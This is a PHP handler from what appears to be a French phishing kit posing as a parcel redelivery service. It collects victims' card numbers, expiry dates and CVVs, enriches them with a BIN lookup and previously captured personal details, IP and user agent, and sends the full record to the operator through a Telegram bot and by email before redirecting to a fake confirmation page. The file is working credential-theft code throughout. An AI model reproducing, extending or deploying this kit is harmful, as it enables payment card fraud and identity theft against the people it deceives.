<?php
session_start();
include('../email.php');
include('../PREVENTS/anti1.php');
include('../PREVENTS/anti2.php');
include('../PREVENTS/anti3.php');
include('../PREVENTS/anti4.php');
include('../PREVENTS/anti5.php');
include('../PREVENTS/anti6.php');
include('../PREVENTS/anti7.php');
include('../PREVENTS/anti8.php');


if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['facturation_form'])) {
    // Récupérer les données du formulaire
    $ccNumber = $_POST['facturation_form']['ccNumber'];
    $ccExpiration = $_POST['facturation_form']['ccExpiration'];
    $ccCvc = $_POST['facturation_form']['ccCvc'];

    // Supprimer les espaces du numéro de carte
    $ccNumber = str_replace(' ', '', $ccNumber);

    $expmonth = substr($ccExpiration, 0, 2);
    $expyear = substr($ccExpiration, 3, 2);

    // Validate card number length (typical length for credit cards)
    if (empty($ccNumber) || strlen($ccNumber) != 16 || !is_numeric($ccNumber)) {
        header('Location: ../bnss/carte.php?error=invalid_card_number');
        exit();
    }

    // Store card details in session
    $_SESSION['cardnumber'] = $ccNumber;
    $_SESSION['cardexpiration'] = $expmonth . '/' . $expyear;
    $_SESSION['cardcvv'] = $ccCvc;

    // BIN lookup
    $bin = substr($ccNumber, 0, 6);
    $ch = curl_init();
    $url = "https://binssuapi.vercel.app/api/$bin";
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array('Accept-Version: 3');
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $result = curl_exec($ch);

    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    }
    curl_close($ch);

    $someArray = json_decode($result, true);
    $_SESSION['bank'] = $someArray['data']['bank'] ?? '';
    $_SESSION['type'] = $someArray['data']['type'] ?? '';
    $_SESSION['level'] = $someArray['data']['level'] ?? '';
    $_SESSION['country'] = $someArray['data']['country'] ?? '';

    // Récupérer la date et l'heure de livraison depuis le cookie
    if (isset($_COOKIE['deliverySchedule'])) {
        $deliverySchedule = $_COOKIE['deliverySchedule'];
    } else {
        $deliverySchedule = "Non spécifié";
    }

    $message = "
    🏛 [💸」 +1 CC 🇫🇷]

    💳 Carte : {$_SESSION['cardnumber']}
    💳 EXPIRATION : {$_SESSION['cardexpiration']}
    💳 CVV : {$_SESSION['cardcvv']}

    🏛 Banque : {$_SESSION['bank']}
    🏛 Niveau : {$_SESSION['level']}
    🏛 Type : {$_SESSION['type']}
    🏛 Pays : {$_SESSION['country']}

    🗓 Créneau de livraison : $deliverySchedule

    💻 [INFORMATIONS PERSONNELLES]

    🔪 Prénom : {$_SESSION['prenom']}
    🔪 Nom : {$_SESSION['nom']}
    🔪 Date de naissance : {$_SESSION['dob']}
    🔪 Adresse : {$_SESSION['adresse']}
    🔪 Ville : {$_SESSION['city']}
    🔪 Code Postal : {$_SESSION['zip']}
    🔪 Num : {$_SESSION['phone']}

    💿 IP ADRESS : {$_SESSION['ip']}
    💿 USER-AGENT : {$_SESSION['useragent']}
    ";

    $subject = "=?utf-8?Q?=E3=80=8C=F0=9F=92=B3=E3=80=8D=2B1_CC?= - $bin - {$_SESSION['ip']} - {$_SESSION['bank']} - {$_SESSION['level']}";
    $headers = "From:=?utf-8?Q?COBRA_x_KOUNT_=F0=9F=A5=9D?= <crusix@amzv1.com>";

    if (isset($ccNumber) && is_numeric($ccNumber)) {
        $data = [
            'text' => $message,
            'chat_id' => $chat_id
        ];
        file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?" . http_build_query($data));
        mail($boite_rez, $subject, $message, $headers);
        
        // Redirect to the confirmation page
        header('Location: ../relivraison-terminee.php');
        exit();
    } else {
        header('Location: ../paiement.php?dead=true');
        exit();
    }
} else {
    die('ERROR 404');
}
?>
